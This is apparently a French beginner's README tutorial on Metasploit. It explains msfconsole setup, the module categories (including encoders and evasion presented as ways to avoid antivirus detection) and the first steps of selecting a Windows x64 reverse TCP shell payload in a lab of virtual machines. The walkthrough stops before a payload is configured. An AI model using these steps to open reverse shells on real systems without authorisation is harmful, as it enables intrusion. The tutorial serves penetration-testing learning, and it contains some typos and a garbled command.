# Les malwars

## Prerequis :
- virtual box
- kali linux dans virtual
- windows 10 dans virtual




## voila l architecture de metaploite


<img width="1277" height="722" alt="image" src="https://github.com/user-attachments/assets/6713005c-ec08-48f7-819e-ee17dfd5a26c" />

## nous utiliserons msfconsole dans la console de kali linux dans virtual box en mode root :

<img width="1282" height="723" alt="image" src="https://github.com/user-attachments/assets/c60cd0f7-662b-4324-ad2a-2676bf5e0b9b" />

## commande pour lancer msfconsole :  

```bash
service postgresql start §§ apach2 start
msfdb init
msfconsole
```

### normalement vous avez ceci 

<img width="595" height="816" alt="image" src="https://github.com/user-attachments/assets/3f89b84b-abe9-40b9-a975-955ef7515b2f" />



## expliquation :

les exploit sont des code malicieux permettant de detourner le fonctionemet d un programme a partir d une vulenrabilité  

les auxilaire sont des outil permettant de scanner des systeme ,qui permettra de decouvrir des port des service et des vulenrabilité  

les post servent a la recherche d information comme les mots de passe , les dossier d une cible etd autre infomration   

les playload sont des code malaveillant que l on  injecte sur la cible en fonction de son architecture afin d etablir une connexion disante   

les encoders nous permettrons de dissumler nos playload afin d etre le moins detecter par les systeme de notre cible

les nops sont des structure par defaut qui permettrons de faire fonctionner nos code malveillant selon les plateforme (web = comment le site est fait,pc= systeme d exeploitation,telephone=os)

les evasion permmettent de generer des playload quasi indetectable par la grande majorité des anti virus

### apres le lancement de msfconsole taper:

````bash
help
````

## explication :

### section core commande :
inserer des commandes de base pour faire des recherches

### section module commande :
obtenir des information specifique

### section job commande :
interagir avec un systeme 

### section ressource script commande :
permet d ajouter nos script a nos test d intrusion

### section databse backend commande :
permet de faire de la reconnaissance sur nos cibles

### section credential backend commande :
renseigne sur l idendité sur nos cibles

### section developper commande :
possede les attribue de modification

### section dns commande :
Gérer le comportement de résolution DNS de Metasploit

### section msfconsole :
simple description

###  je vous ai expliquez les section des commande , pour toutes les commande le description se trouve a cote dans l interface consol msfconsole 
 ## exemple:

 <img width="1920" height="922" alt="image" src="https://github.com/user-attachments/assets/2b809094-d5d6-41f1-8edd-e9c96c66e064" />
 

### je vais vous montrer comment faire des playload alors tout d abord qu est ce qu c est des playload exactement 🤔 :

<img width="1280" height="718" alt="Capture d&#39;écran 2026-09-03 185758" src="https://github.com/user-attachments/assets/e8dc22d7-8e1e-4667-be57-02df2fa4e3e9" />

# generer un playload :

### commande a taper :

````bash
use PAYLOAD/
````

### vous verrer des millier de champs qui vous ferront mal au crane (oui j ai eut mal -__-)

taper just cette commande :

````bash
use payload/windows/x64/shell_reverse_tcp
````
il va creer  un shell Windows via une connexion TCP inverse.

puis : 

````bash
options
````
ouvrez un nouveau terminal et taper :

````bash
ifconfig
````
critquez pas svp -__-

<img width="1920" height="922" alt="645845784-a7ac75af-2cea-4be0-bde2-e76bb0a98350" src="https://github.com/user-attachments/assets/48f4b797-0399-4a39-b506-f8b88090e2f5" />



